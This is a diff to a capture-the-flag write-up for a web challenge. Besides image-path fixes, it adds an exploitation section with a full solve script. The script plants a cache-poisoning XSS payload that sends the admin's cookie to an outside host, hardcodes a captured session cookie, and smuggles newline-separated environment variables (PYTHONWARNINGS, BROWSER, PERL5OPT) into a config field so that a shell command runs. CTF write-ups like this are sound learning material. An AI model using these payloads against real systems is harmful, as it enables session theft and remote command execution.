@@ -478,7 +478,7 @@ The most obvious starting point is os.environ.
 grep -R "os.environ\[" -n .
 ```
 
-![grep output scrolling](images/2025-12-25-23-41-33.png)
+![grep output scrolling](/images/2025-12-25-23-41-33.png)
 
 This gives a lot of results, most of which are boring:
 configuration flags, paths, feature toggles, etc.
@@ -489,7 +489,7 @@ Something referencing… BROWSER.
 
 ##### Following the trail: BROWSER
 
-![grep result highlighting webbrowser.py](images/2025-12-25-23-42-39.png)
+![grep result highlighting webbrowser.py](/images/2025-12-25-23-42-39.png)
 
 That leads us to:
 
@@ -523,7 +523,7 @@ Back to grepping.
 grep -R "import webbrowser" -n .
 ```
 
-![grep output showing antigravity.py](images/2025-12-25-23-46-04.png)
+![grep output showing antigravity.py](/images/2025-12-25-23-46-04.png)
 
 And there it is.
 
@@ -539,4 +539,80 @@ Because now the challenge description makes sense.
 That wasn’t flavor text.
 That was a hint.
 
-PWNED!!!!
+## Exploitation
+
+The rest of the challenge is easy, here is the solve script:
+
+```py
+#!/usr/bin/env python3
+#
+# Solve script for web/library-vault
+#
+# Author: hxuu <hxuu@example.invalid>
+# License: MIT (not that it matters though..)
+
+import requests
+from urllib.parse import quote
+
+url = 'http://localhost:1337'
+
+# Create user session
+session = requests.Session()
+
+# register/login
+data = {
+    "username": 'foo',
+    "username": 'bar'
+}
+session.post(url+"/register", data=data)
+session.post(url+"/login", data=data)
+
+# poison the cache
+xss = {
+    "query": "<script>fetch(`http://172.17.0.1/?${document.cookie}`)</script>"
+}
+session.get(url+f"/search?query={quote('I BELEIVE IT DOESNT WORK')}", data=xss)
+
+# report to the admin
+headers = {
+    "Referer": url+f"/search?query={quote('I BELEIVE IT DOESNT WORK')}"
+}
+session.post(url+f"/api/report", headers=headers, data=xss)
+exit()
+
+# replace with correct one captured from ncat
+ADMIN_COOKIE = '2|1:0|10:1766673018|8:username|8:YWRtaW4=|cc65c9796777076da04584bd6bdf535a53da75b37e13caee275c6e6bcc7c5c58'
+admin_cookies = {
+    "username": ADMIN_COOKIE
+}
+
+trigger_payload = {
+    "action": "reset_config"
+}
+resp = requests.post(url+"/panel", data=trigger_payload, cookies=admin_cookies)
+
+# change with the command you want
+# Note: watch out for the use of spaces/shell_envs to add spaces to the command
+# to execute. The perl execution context will be affected by the .env first
+# (spaces will terminate env variable value and perl eats ${IFS} before it executes as the command seperator)
+command = 'cat\\t/flag.txt'
+env_payload = {
+    "action": "update_config",
+    "backup_server": "a\\",
+    "archive_path": (
+        '\n'
+        '#\n'
+        'PYTHONWARNINGS=all:0:antigravity.x:0:0\n'
+        'BROWSER=perlthanks\n'
+        f'PERL5OPT=-Mbase;print(`{command}`);exit;\n'
+        '#'
+    ),
+}
+requests.post(url+"/panel", data=env_payload, cookies=admin_cookies)
+
+trigger_payload = {
+    "action": "run_backup"
+}
+resp = requests.post(url+"/panel", data=trigger_payload, cookies=admin_cookies)
+print(resp.text)
+```
